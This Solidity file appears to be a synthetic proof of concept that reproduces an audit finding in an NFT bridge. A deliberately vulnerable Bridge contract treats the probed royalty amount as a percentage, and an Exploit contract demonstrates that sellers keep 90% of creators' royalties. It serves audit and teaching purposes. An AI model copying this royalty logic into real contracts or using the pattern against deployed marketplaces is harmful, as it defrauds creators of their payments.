// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  Sweep n Flip bridge — royaltyInfo's amount is used as a percentage
    (Cantina / slowfi, AuditVault 46495).
    SYNTHETIC, cheatcode-free. A 1% royalty probed at sale price 1000
    returns 10. That 10 is stored as the percentage. On a 1 ether sale
    the callback pays 1 ether * 10 / 10000 = 1e15. The fair 1% is 1e16.
    The seller keeps the 9e15 the creator should have received. */

contract Pay {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract RoyaltyNft {
    address public immutable creator;

    constructor(address creator_) {
        creator = creator_;
    }

    function royaltyInfo(uint256, uint256 salePrice) external view returns (address, uint256) {
        return (creator, salePrice * 100 / 10_000);
    }
}

contract Buyer {
    Pay public immutable pay;

    constructor(Pay pay_) {
        pay = pay_;
    }

    function approve(address spender) external {
        pay.approve(spender, type(uint256).max);
    }
}

contract Bridge {
    uint256 public constant PROBE = 1000;
    uint256 public constant BPS = 10_000;

    function _getRoyaltyPercentage(RoyaltyNft nft) internal view returns (uint256) {
        (, uint256 royaltyAmount) = nft.royaltyInfo(0, PROBE);
        // @> VULN: the absolute royalty for the probe price is returned as the percentage.
        return royaltyAmount;
    }

    function executeSale(RoyaltyNft nft, Pay pay, address buyer, address seller, uint256 salePrice)
        external
        returns (uint256 royaltyPaid)
    {
        uint256 pct = _getRoyaltyPercentage(nft);
        royaltyPaid = salePrice * pct / BPS;
        address creator = nft.creator();
        pay.transferFrom(buyer, creator, royaltyPaid);
        pay.transferFrom(buyer, seller, salePrice - royaltyPaid);
    }

    function fairRoyalty(uint256 salePrice) external pure returns (uint256) {
        return salePrice * 100 / BPS;
    }
}

contract Exploit {
    uint256 public constant SALE = 1 ether;

    Pay public pay;
    RoyaltyNft public nft;
    Buyer public buyer;
    Bridge public bridge;
    address public creator;
    uint256 public sellerGot;
    uint256 public creatorGot;
    uint256 public fairCreator;
    uint256 public kept;

    constructor() {
        creator = address(0xC0FFEE);
        pay = new Pay();
        nft = new RoyaltyNft(creator);
        buyer = new Buyer(pay);
        bridge = new Bridge();
        pay.mint(address(buyer), SALE);
        buyer.approve(address(bridge));
    }

    function run() external {
        (, uint256 probed) = nft.royaltyInfo(0, 1000);
        require(probed == 10, "probe amount");
        bridge.executeSale(nft, pay, address(buyer), address(this), SALE);
        sellerGot = pay.balanceOf(address(this));
        creatorGot = pay.balanceOf(creator);
        fairCreator = bridge.fairRoyalty(SALE);
        kept = fairCreator - creatorGot;
        require(creatorGot == 1e15, "callback paid 0.001 ether");
        require(fairCreator == 1e16, "fair 1% is 0.01 ether");
        require(sellerGot == SALE - 1e15, "seller kept the rest");
        require(kept == 9e15, "creator short 0.009 ether");
        require(pay.balanceOf(address(buyer)) == 0, "buyer paid the sale");
    }
}
